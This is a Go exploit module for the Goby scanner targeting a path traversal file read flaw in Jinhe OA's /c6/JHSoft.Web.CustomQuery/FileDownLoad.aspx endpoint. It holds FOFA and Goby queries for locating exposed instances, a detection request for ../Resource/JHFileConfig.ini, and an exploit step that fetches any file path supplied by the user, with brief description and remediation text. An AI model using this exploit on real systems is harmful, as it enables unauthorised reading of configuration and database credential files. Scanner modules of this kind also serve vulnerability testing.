package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Jinhe OA /c6/JHSoft.Web.CustomQuery/FileDownLoad.aspx File Read Vulnerability",
    "Description": "<p>Jinhe Network is a professional information service provider that provides Internet + supervision solutions to urban regulatory authorities, and provides enterprises and institutions with services such as organizational collaboration OA system development platform, e-government integration platform, and smart e-commerce platform. There is a file reading vulnerability in the filepath parameter in the /c6/JHSoft.Web.CustomQuery/FileDownLoad.aspx interface. An attacker can use this vulnerability to read the system configuration file.</p>",
    "Product": "Jinher-OA",
    "Homepage": "http://www.jinher.com/",
    "DisclosureDate": "2024-05-09",
    "PostTime": "2024-05-15",
    "Author": "secure_insights@163.com",
    "FofaQuery": "title=\"金和协同管理平台\" || body=\"js/PasswordCommon.js\" || body=\"js/PasswordNew.js\" || body=\"Jinher Network\" || (body=\"c6/Jhsoft.Web.login\" && body=\"CloseWindowNoAsk\") || body=\"/jc6/WEB-INF/jsp/platform/sys/login/finallogin.jsp\" ",
    "GobyQuery": "title=\"金和协同管理平台\" || body=\"js/PasswordCommon.js\" || body=\"js/PasswordNew.js\" || body=\"Jinher Network\" || (body=\"c6/Jhsoft.Web.login\" && body=\"CloseWindowNoAsk\") || body=\"/jc6/WEB-INF/jsp/platform/sys/login/finallogin.jsp\" ",
    "Level": "1",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.jinher.com/\">http://www.jinher.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/138597704#/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filepath",
            "type": "input",
            "value": "../Resource/JHFileConfig.ini",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/c6/JHSoft.Web.CustomQuery/FileDownLoad.aspx?FilePath=../Resource/JHFileConfig.ini",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
                    "Accept-Encoding": "gzip"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "filename=JHFileConfig.ini",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/c6/JHSoft.Web.CustomQuery/FileDownLoad.aspx "
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/c6/JHSoft.Web.CustomQuery/FileDownLoad.aspx?FilePath={{{filepath}}}",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
                    "Accept-Encoding": "gzip"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "filename=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.4",
    "Translation": {
        "CN": {
            "Name": "金和OA /c6/JHSoft.Web.CustomQuery/FileDownLoad.aspx 文件读取漏洞",
            "Product": "金和网络-金和OA",
            "Description": "<p>金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。在/c6/JHSoft.Web.CustomQuery/FileDownLoad.aspx接口中filepath参数存在文件读取漏洞，攻击者可利用该漏洞读取系统配置文件。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.jinher.com/\">http://www.jinher.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Jinhe OA /c6/JHSoft.Web.CustomQuery/FileDownLoad.aspx File Read Vulnerability",
            "Product": "Jinher-OA",
            "Description": "<p>Jinhe Network is a professional information service provider that provides Internet + supervision solutions to urban regulatory authorities, and provides enterprises and institutions with services such as organizational collaboration OA system development platform, e-government integration platform, and smart e-commerce platform. There is a file reading vulnerability in the filepath parameter in the /c6/JHSoft.Web.CustomQuery/FileDownLoad.aspx interface. An attacker can use this vulnerability to read the system configuration file.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.jinher.com/\">http://www.jinher.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10950"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}